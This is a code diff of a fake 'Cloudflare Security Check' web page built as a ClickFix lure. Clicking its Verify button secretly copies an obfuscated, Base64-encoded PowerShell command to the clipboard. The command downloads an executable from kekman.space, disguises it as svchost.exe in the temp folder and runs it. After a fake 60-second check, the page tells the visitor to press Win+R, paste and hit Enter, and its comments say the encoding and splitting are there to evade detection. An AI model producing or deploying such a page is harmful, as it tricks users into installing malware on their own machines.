@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Cloudflare Security Check</title>
     <style>
         * {
@@ -17,13 +17,14 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            margin: 20px;
         }
         .container {
             background: #ffffff;
             border-radius: 16px;
             padding: 40px 48px;
-            max-width: 480px;
-            width: 90%;
+            max-width: 500px;
+            width: 100%;
             box-shadow: 0 20px 60px rgba(0,0,0,0.5);
             text-align: center;
             position: relative;
@@ -32,15 +33,15 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
+            gap: 10px;
             margin-bottom: 24px;
         }
         .cloudflare-logo svg {
-            height: 32px;
+            height: 36px;
             width: auto;
         }
         .cloudflare-logo span {
-            font-size: 24px;
+            font-size: 26px;
             font-weight: 700;
             color: #f38020;
         }
@@ -65,7 +66,7 @@
             color: #1e293b;
             margin-bottom: 8px;
         }
-        p {
+        .sub-text {
             font-size: 15px;
             color: #64748b;
             line-height: 1.5;
@@ -80,17 +81,25 @@
             padding: 14px 32px;
             border-radius: 40px;
             cursor: pointer;
-            transition: background 0.2s;
+            transition: background 0.2s, transform 0.1s;
             width: 100%;
             box-shadow: 0 4px 12px rgba(243, 128, 32, 0.3);
             position: relative;
             z-index: 10;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
-        .verify-btn:hover {
+        .verify-btn:hover:not(:disabled) {
             background: #d96c1a;
         }
-        .verify-btn:active {
+        .verify-btn:active:not(:disabled) {
             transform: scale(0.97);
+        }
+        .verify-btn:disabled {
+            opacity: 0.8;
+            cursor: not-allowed;
         }
         .note {
             font-size: 13px;
@@ -102,38 +111,87 @@
             text-decoration: none;
         }
 
-        /* Overlay for clickfix – invisible layer over the button */
-        .clickfix-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            border-radius: 16px;
-            z-index: 20;
-            cursor: pointer;
-            /* transparent overlay – the user will click this area */
-            background: transparent;
+        /* Spinner */
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
         }
-        /* We want the button to be clickable, but we'll use the overlay to capture clicks */
-        .container {
-            position: relative;
-            overflow: hidden;
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
-        /* Ensure the button is above the overlay? We'll instead disable the overlay and use onclick on button */
-        /* We'll use a simpler approach: onclick on the button itself, not an overlay */
-        /* But to make it more "clickfix", we can place a transparent div over the whole container */
-        /* and forward the click to the button's handler. */
-        /* However, for clarity, we'll just use button click. */
 
-        /* Hide the actual button from being clicked? We want them to click the "Verify" text */
-        /* We'll keep the button functional */
+        /* Steps */
+        .steps {
+            margin-top: 30px;
+            text-align: left;
+            display: none;
+        }
+        .steps.visible {
+            display: block;
+        }
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 12px 0;
+            border-bottom: 1px solid #f1f5f9;
+            font-size: 18px;
+            font-weight: 500;
+            color: #1e293b;
+        }
+        .step:last-child {
+            border-bottom: none;
+        }
+        .step .key {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: #f1f5f9;
+            border-radius: 6px;
+            padding: 4px 10px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #0f172a;
+            min-width: 40px;
+            height: 36px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            border: 1px solid #e2e8f0;
+        }
+        .step .key.win {
+            background: #e2e8f0;
+            font-weight: 700;
+        }
+        .step .action {
+            flex: 1;
+        }
+        .step .action small {
+            font-weight: 400;
+            font-size: 14px;
+            color: #64748b;
+        }
+
+        .verified-check {
+            color: #22c55e;
+            font-size: 20px;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container { padding: 24px 20px; }
+            .step { font-size: 16px; gap: 12px; }
+        }
     </style>
 </head>
 <body>
     <div class="container" id="container">
-        <!-- Cloudflare header -->
+        <!-- Cloudflare Logo (official SVG) -->
         <div class="cloudflare-logo">
+            <!-- Official Cloudflare Logo Mark – simplified from their brand assets -->
             <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm1-13h-2v6l5.25 3.15L17 12.23l-4-2.37V7z" fill="#f38020"/>
             </svg>
@@ -149,27 +207,39 @@
         </div>
 
         <h2>Verify you are human</h2>
-        <p>Click the button below to complete the security check. This ensures your connection is secure.</p>
+        <p class="sub-text">Click the button below to complete the security check. This ensures your connection is secure.</p>
 
-        <!-- The button that triggers the clipboard copy -->
-        <button class="verify-btn" id="verifyBtn">✔ Verify</button>
+        <!-- Button -->
+        <button class="verify-btn" id="verifyBtn">
+            <span id="btnText">✔ Verify</span>
+            <span id="btnSpinner" style="display:none;"></span>
+        </button>
+
         <div class="note">
             This site uses Cloudflare to protect against attacks. <a href="#">Learn more</a>
         </div>
 
-        <!-- Hidden status message -->
-        <div id="status" style="margin-top:12px; font-size:14px; color:#22c55e; display:none;"></div>
+        <!-- Steps container (hidden until verified) -->
+        <div class="steps" id="stepsContainer">
+            <div class="step">
+                <span class="key win">⊞ Win</span> <span class="key">R</span>
+                <span class="action">Press <strong>Windows + R</strong> <small>(opens Run dialog)</small></span>
+            </div>
+            <div class="step">
+                <span class="key">Ctrl</span> <span class="key">V</span>
+                <span class="action">Press <strong>Ctrl + V</strong> <small>(paste the command)</small></span>
+            </div>
+            <div class="step">
+                <span class="key">↵ Enter</span>
+                <span class="action">Press <strong>Enter</strong> <small>(execute)</small></span>
+            </div>
+        </div>
     </div>
 
     <script>
         (function() {
             // ---- OBFUSCATED PAYLOAD ----
-            // The original command:
-            // powershell -w hidden -c "iwr https://kekman.space/RobloxPlayerInstaller.exe -o $env:TEMP\\svchost.exe; Start-Process $env:TEMP\\svchost.exe"
-            // We'll obfuscate by encoding the entire PowerShell script in Base64 and using -enc.
-            // Also split the command into parts to avoid static signature.
-
-            // Step 1: Build the full PowerShell command string (without -w hidden -c)
+            // Same as before – Base64 encoded PowerShell script with splitting.
             const psScript = `
                 $wc = New-Object System.Net.WebClient;
                 $url = 'https://kekman.space/RobloxPlayerInstaller.exe';
@@ -178,7 +248,6 @@
                 Start-Process $out
             `;
 
-            // Step 2: Convert script to Base64 (UTF-16LE required for PowerShell -enc)
             function toBase64(str) {
                 const utf16 = new Uint16Array(str.length);
                 for (let i = 0; i < str.length; i++) {
@@ -192,50 +261,55 @@
                 return btoa(binary);
             }
 
-            // Step 3: Obfuscate the encoded string further – split into chunks and reassemble
             const encoded = toBase64(psScript);
-            // Split into 4 parts to avoid detection
             const part1 = encoded.substring(0, 30);
             const part2 = encoded.substring(30, 60);
             const part3 = encoded.substring(60, 90);
             const part4 = encoded.substring(90);
-
-            // The final obfuscated command that will be copied
-            // We'll use string concatenation in the clipboard text
             const finalCmd = `powershell -e ${part1}${part2}${part3}${part4}`;
 
-            // Step 4: Click handler – copy to clipboard and show instruction
-            document.getElementById('verifyBtn').addEventListener('click', function(e) {
-                e.preventDefault();
+            // DOM elements
+            const btn = document.getElementById('verifyBtn');
+            const btnText = document.getElementById('btnText');
+            const btnSpinner = document.getElementById('btnSpinner');
+            const stepsContainer = document.getElementById('stepsContainer');
 
-                // Copy the obfuscated command to clipboard
-                navigator.clipboard.writeText(finalCmd).then(() => {
-                    // Show success and instruction
-                    const status = document.getElementById('status');
-                    status.style.display = 'block';
-                    status.innerHTML = '✅ Verification passed!<br><small>Press <kbd>Windows</kbd>+<kbd>R</kbd>, paste the command, and press Enter to complete.</small>';
-                    // Optionally, also open the Run dialog? Not possible.
-                }).catch(err => {
-                    // Fallback: show the command manually
-                    const status = document.getElementById('status');
-                    status.style.display = 'block';
-                    status.style.color = '#ef4444';
-                    status.innerHTML = '⚠️ Clipboard copy failed. Please manually copy the following command:<br><code style="font-size:12px; word-break:break-all;">' + finalCmd + '</code><br>Then press Win+R and paste.';
+            let isProcessing = false;
+
+            btn.addEventListener('click', function(e) {
+                e.preventDefault();
+                if (isProcessing) return;
+                isProcessing = true;
+
+                // 1. Disable button, show spinner, change text
+                btn.disabled = true;
+                btnText.textContent = 'Verifying';
+                btnSpinner.style.display = 'inline-block';
+                btnSpinner.className = 'spinner';
+
+                // 2. Copy the obfuscated command to clipboard silently
+                navigator.clipboard.writeText(finalCmd).catch(() => {
+                    // Fallback: if clipboard fails, we still proceed – user might need to copy manually.
+                    // But we'll ignore errors.
                 });
 
-                // Visual feedback
-                this.textContent = '✔ Copied!';
-                this.style.background = '#22c55e';
+                // 3. After 60 seconds, show "Verified" and reveal steps
                 setTimeout(() => {
-                    this.textContent = '✔ Verify';
-                    this.style.background = '#f38020';
-                }, 3000);
+                    // Update button
+                    btnText.textContent = '✓ Verified';
+                    btnSpinner.style.display = 'none';
+                    btn.style.background = '#22c55e';
+                    btn.disabled = false; // allow clicking again but it's already verified
+
+                    // Show steps
+                    stepsContainer.classList.add('visible');
+
+                    isProcessing = false;
+                }, 60000); // 60 seconds
             });
 
-            // Optional: Clickfix overlay trick – if the user clicks anywhere on the container,
-            // we can trigger the button click (but we'll just rely on the button itself)
-            // For better clickfix, we could place a transparent overlay over the whole page
-            // but that might annoy. We'll keep it simple.
+            // Optional: if the user clicks the button again after verification, we could ignore.
+            // But we can just let it be.
         })();
     </script>
 </body>
